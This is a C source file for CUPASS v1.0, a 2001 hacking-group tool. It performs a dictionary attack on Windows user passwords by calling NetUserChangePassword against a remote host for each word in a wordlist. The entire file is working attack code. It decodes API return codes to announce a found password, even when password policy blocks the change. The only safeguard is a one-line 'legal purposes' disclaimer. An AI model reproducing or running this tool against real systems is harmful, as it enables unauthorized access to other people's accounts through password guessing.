/*
 * CUPASS v1.0 (c) 2001 by Doc Holiday / THC <Holiday@TheHackersChoice.com>
 * http://www.hackerschoice.com
 *
 * Dictionary Attack against Windows Passwords with NetUserChangePassword.
 * Do only use for legal purposes.
 * 
 * Compiled and tested on Windows NT/W2K
 * Compiled with VC++ 6.0
 *
 */



#define UNICODE 1
#define _UNICODE 1

#include <windows.h>
#include <lmaccess.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment( lib, "netapi32.lib" )



void wmain( int argc, wchar_t *argv[] )
{
	wchar_t *hostname = 0; 
	wchar_t *username = 0; 
	wchar_t *dictfile = 0; 
	wchar_t myChar[256];
	NET_API_STATUS result;
	FILE *stream;
	LPWSTR oldpassword; 


	if (argc != 4)
	{ 
        wprintf (L"\nMissing or wrong parameters!\n"); 
	    wprintf (
               L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
	    exit(1);
	}


    
	hostname = argv[1];
	username = argv[2];
	dictfile = argv[3];

	
	
    if (wcsncmp(hostname, L"\\\\",2 )!=0)
	{
	    wprintf (L"\nups... you forgot the double backslash?");
            wprintf (
                L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
	    exit(1);
	}

	

  if( (stream  = _wfopen( dictfile, L"r" )) == NULL )
	{
      wprintf( L"\nups... dictionary %s could not be opened", dictfile );
      wprintf (L"\nUsage: cupass \\\\hostname username dictionaryfile\n");
	}
   else
   {
	
	wprintf (L"\n*** CUPASS 1.0 - Change User PASSword - by Doc Holiday/THC (c) 2001 ***\n");
	wprintf (L"\nStarting attack .....\n");
	wprintf (L"\nTarget: %s ", hostname);
	wprintf (L"\nUser: %s\n ", username);

	while( !feof( stream ) )
	{
	  fgetws (myChar, 256,stream);

	  if (myChar[wcslen(myChar)-1] == '\r') myChar[wcslen(myChar)-1] = '\0';
	  if (myChar[wcslen(myChar)-1] == '\n') myChar[wcslen(myChar)-1] = '\0';

          oldpassword = myChar;
   
    	  wprintf( L"\nTrying password %s \n", oldpassword );
		
	  result = NetUserChangePassword( hostname, username,oldpassword, oldpassword );
		
	  switch (result)
	  {
		case 0: 
			wprintf( L"GOTCHA!! Password was changed\n" );
			wprintf( L"\nPassword from user '%s' is '%s'\n", username, oldpassword);
			fclose (stream);
			exit (1);
			break;
			
		case 5: //ERROR_ACCESS_DENIED
			wprintf (L"Attempt failed -> ERROR_ACCESS_DENIED - But password could be %s\n", oldpassword);
			fclose (stream);
			exit(1);
			break;
			
		case 86: //ERROR_INVALID_PASSWORD
			wprintf( L"Attempt failed -> Incorrect password\n" );
			break;
			
		case 1351: //ERROR_CANT_ACCESS_DOMAIN_INFO 
			wprintf (L"Attempt failed -> Can't establish connection to Host %s\n",hostname);
			fclose (stream);
			exit(1);
			break;

		case 1909: //ERROR_ACCOUNT_LOCKED_OUT
			wprintf (L"Attempt failed -> Account locked out\n");
			fclose (stream);
			exit(1);
			break;

		case 2221: //NERR_UserNotFound) 
			wprintf (L"Attempt failed -> User %s not found\n", username);
			fclose (stream);
			exit(1);		   
			break;
			
		case 2226://NERR_NotPrimary
			wprintf (L"Attempt failed -> Operation only allowed on PDC\n");
			break;

		case 2245:
			wprintf (L"GOTCHA!! Password is '%s' , but couldn't be changed to '%s' due to password policy settings!\n", oldpassword, oldpassword);
			fclose(stream);
			exit(1);
			break;

		default:
			wprintf( L"\nAttempt failed :( %lu\n", result );
			fclose(stream);
			exit(1);
			break;
		}
	}
	fclose (stream); 
   }	
}
